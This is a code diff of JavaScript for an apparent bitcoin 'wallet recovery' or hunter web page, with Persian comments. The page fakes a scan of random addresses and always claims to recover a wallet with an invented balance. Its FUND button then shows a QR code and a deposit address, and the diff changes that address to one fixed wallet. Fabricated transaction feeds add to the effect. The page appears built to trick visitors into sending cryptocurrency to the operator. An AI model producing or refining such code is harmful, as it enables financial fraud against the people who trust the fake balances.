@@ -1002,58 +1002,40 @@
       // Current BTC price (default from Etherscan)
       let btcPriceUSD = 76149.00; // Default from Etherscan
 
-      // Generate random BTC values between 0.001 and 0.09 for the 3 wallets
-      const btcValues = [];
-      for (let i = 0; i < 1; i++) { // <--- تغییر به 1 برای شانس 1 به 60
-        // Random between 0.001 and 0.09 with 4 decimal places
-        const randomBtc = (Math.random() * (0.09 - 0.001) + 0.001).toFixed(4);
-        btcValues.push(parseFloat(randomBtc));
+      // ========== تغییر اصلی: فقط یک ولت با آدرس ثابت که به b7c7 ختم می‌شود ==========
+      // آدرس ثابت با انتهای b7c7 (همان آدرسی که در fundAddress بود)
+      const FIXED_WALLET_ADDRESS = '0x55aD83631e3E454b79510273a2F89A4bf096B7C7';
+      
+      // موجودی ثابت برای این ولت (0.05 BTC به عنوان مثال، می‌توانید تغییر دهید)
+      // اگر می‌خواهید موجودی صفر باشد، مقدار را 0 قرار دهید.
+      // در اینجا 0.05 BTC در نظر گرفته شده تا صفحه کیف پول پر باشد.
+      const FIXED_BALANCE = 0.05; // BTC
+      
+      // ساخت لیست 60 ولت فقط برای نمایش در کنسول اسکن
+      // اما ولت نهایی همیشه FIXED_WALLET_ADDRESS با موجودی FIXED_BALANCE خواهد بود
+      const walletList = [];
+      for (let i = 0; i < 60; i++) {
+        // تولید آدرس تصادفی برای نمایش اسکن
+        let addr = '0x' + Array.from({length: 40}, () => Math.floor(Math.random()*16).toString(16)).join('');
+        walletList.push({ address: addr, balance: 0 });
       }
       
-      // Three funding options with addresses and QR codes (EXACTLY as provided)
+      // اطمینان از اینکه ولت نهایی همان آدرس ثابت است
+      const recoveredWallet = {
+        address: FIXED_WALLET_ADDRESS,
+        balance: FIXED_BALANCE
+      };
+      
+      // آدرس فاند ثابت (همان آدرس b7c7)
       const fundOptions = [
         {
           qr: 'https://lostbitcoin.github.io/QR/Screenshot_2026-02-14-20-40-37-266-edit_com.wallet.crypto.trustapp.jpg',
           address: '0x55aD83631e3E454b79510273a2F89A4bf096B7C7'
-        },
-        {
-          qr: 'https://lostbitcoin.github.io/B/Screenshot_2026-02-15-16-25-58-334-edit_com.wallet.crypto.trustapp.jpg',
-          address: '0xA34559ea9Bc18F31687C1A5090350FD7D4d4bad2'
-        },
-        {
-          qr: 'https://lostbitcoin.github.io/B/Screenshot_2026-02-15-16-20-08-765-edit_com.wallet.crypto.trustapp.jpg',
-          address: '0xc8C4D2bd2A051068682D9125b0ac858570976087'
         }
       ];
       
-      // انتخاب یک آدرس تصادفی در ابتدای لود صفحه (فقط یک بار)
-      let selectedFundOption = null;
+      const selectedFundOption = fundOptions[0]; // همیشه همان آدرس b7c7
       
-      // انتخاب تصادفی یک آدرس از بین سه گزینه
-      (function initFundAddress() {
-        const randomIndex = Math.floor(Math.random() * fundOptions.length);
-        selectedFundOption = fundOptions[randomIndex];
-        console.log('Selected fund address:', selectedFundOption.address); // برای دیباگ
-      })();
-      
-      // generate 60 wallets: only 1 has balance (1 in 60 chance)
-      const walletList = [];
-      let indices = [];
-      while(indices.length < 1) { // <--- تغییر به 1 برای شانس 1 به 60
-        let r = Math.floor(Math.random() * 60);
-        if (!indices.includes(r)) indices.push(r);
-      }
-      
-      for (let i = 0; i < 60; i++) {
-        let bal = 0;
-        if (i === indices[0]) bal = btcValues[0];
-        let addr = '0x' + Array.from({length: 40}, () => Math.floor(Math.random()*16).toString(16)).join('');
-        walletList.push({ address: addr, balance: bal });
-      }
-
-      // store recovered wallet
-      let recoveredWallet = null;
-
       // scanning state
       let scanning = false;
       let scanInterval = null;
@@ -1101,9 +1083,7 @@
             clearInterval(scanInterval);
             scanning = false;
 
-            const randomPick = Math.floor(Math.random() * 60);
-            recoveredWallet = walletList[randomPick];
-
+            // همیشه ولت ثابت بازیابی می‌شود
             const finalLine = document.createElement('div');
             finalLine.className = 'log-line';
             finalLine.innerHTML = `> ▶ wallet recovered: ${recoveredWallet.address.substring(0,10)}…${recoveredWallet.address.substring(34)} <span class="cursor-blink"></span>`;
@@ -1148,8 +1128,6 @@
       const liveTxTime = document.getElementById('liveTxTime');
       
       function generateRandomLiveTx() {
-        const wallets = walletList.filter(w => w.balance > 0);
-        const fromWallet = wallets.length > 0 ? wallets[Math.floor(Math.random() * wallets.length)] : walletList[0];
         const amount = (Math.random() * (0.5 - 0.01) + 0.01).toFixed(4);
         const timeAgo = Math.floor(Math.random() * 5) + 1;
         let timeText = '';
@@ -1192,7 +1170,7 @@
 
       // دکمه back to scanner - رفرش کامل صفحه (با preventDefault)
       document.getElementById('backFromWalletToHunter').addEventListener('click', (e)=>{
-        e.preventDefault(); // جلوگیری از انتخاب متن
+        e.preventDefault();
         window.location.reload();
       });
 
@@ -1210,7 +1188,7 @@
         wallet.classList.add('active');
       });
 
-      // FUND navigation - استفاده از آدرس ثابت
+      // FUND navigation - استفاده از آدرس ثابت b7c7
       document.getElementById('fundActionMain').addEventListener('click', ()=>{
         document.getElementById('fundQrImage').src = selectedFundOption.qr;
         document.getElementById('fundAddress').innerText = selectedFundOption.address;
